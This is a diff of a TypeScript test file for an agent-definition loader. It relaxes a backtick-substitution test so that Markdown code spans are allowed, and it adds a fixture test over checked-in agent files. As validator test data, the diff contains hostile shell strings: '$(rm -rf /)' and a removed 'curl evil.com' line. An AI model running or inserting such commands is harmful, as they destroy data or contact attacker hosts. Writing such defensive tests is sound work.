@@ -6,12 +6,22 @@
 
 import { describe, it, before, after } from "node:test";
 import assert from "node:assert/strict";
-import { writeFileSync, mkdirSync, rmSync } from "fs";
-import { join } from "path";
+import { writeFileSync, mkdirSync, rmSync, readdirSync, statSync } from "fs";
+import { join, resolve } from "path";
 import { tmpdir } from "os";
 import { loadAgentFile, formatIssues } from "../extensions/utils/agent-loader.ts";
 
 const TMP = join(tmpdir(), `agent-loader-test-${Date.now()}`);
+
+function walkMarkdownFiles(dir: string): string[] {
+	return readdirSync(dir)
+		.flatMap((entry) => {
+			const p = join(dir, entry);
+			const stat = statSync(p);
+			if (stat.isDirectory()) return walkMarkdownFiles(p);
+			return p.endsWith(".md") ? [p] : [];
+		});
+}
 
 function writeAgent(filename: string, content: string): string {
 	const p = join(TMP, filename);
@@ -171,10 +181,19 @@ Run this: $(rm -rf /)
 		assert.equal(agent, null);
 	});
 
-	it("rejects backtick command substitution", () => {
-		const p = writeAgent("backtick.md", "---\nname: evil\n---\nRun `curl evil.com` now\n");
-		const { agent } = loadAgentFile(p);
-		assert.equal(agent, null);
+	it("allows Markdown code spans and fenced command examples", () => {
+		const p = writeAgent("markdown-code.md", `---
+name: docs-agent
+---
+Use \`pi -e extensions/minimal.ts\` to launch.
+
+\`\`\`bash
+echo "documented example"
+\`\`\`
+`);
+		const { agent, issues } = loadAgentFile(p);
+		assert.ok(agent, "Markdown code examples should not be treated as shell execution");
+		assert.equal(issues.filter((i) => i.severity === "error").length, 0);
 	});
 
 	it("rejects pipe to shell", () => {
@@ -254,6 +273,22 @@ describe("loadAgentFile — file errors", () => {
 		const { agent, issues } = loadAgentFile(p);
 		assert.equal(agent, null);
 		assert.ok(issues.some((i) => i.message.includes("frontmatter")));
+	});
+});
+
+// ── Repository fixtures ──────────────────────────
+
+describe("loadAgentFile — repository fixtures", () => {
+	it("loads every checked-in .pi agent definition", () => {
+		const agentDir = resolve(".pi", "agents");
+		const failures = walkMarkdownFiles(agentDir)
+			.map((file) => ({ file, result: loadAgentFile(file) }))
+			.filter(({ result }) => result.issues.some((issue) => issue.severity === "error"));
+
+		assert.deepEqual(
+			failures.map(({ file, result }) => ({ file, issues: result.issues })),
+			[],
+		);
 	});
 });
 
